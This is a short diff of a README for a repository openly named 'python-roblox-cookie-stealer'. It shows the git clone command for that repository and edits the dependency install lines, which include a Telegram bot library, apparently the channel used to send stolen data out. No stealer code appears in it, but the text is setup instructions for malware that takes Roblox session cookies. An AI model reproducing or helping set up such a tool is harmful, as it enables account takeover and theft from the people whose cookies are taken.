@@ -5,7 +5,7 @@ git clone https://github.com/Lufisar/python-roblox-cookie-stealer
 
 <b>You will need libraries:</b>
 ```bash
-python pip install pyTelegramBotAPI
-python pip install shutil-ext
-python pip install pypiwin32
-python pip install base64
+pip install pyTelegramBotAPI
+pip install shutil-ext
+pip install pypiwin32
+pip install base64
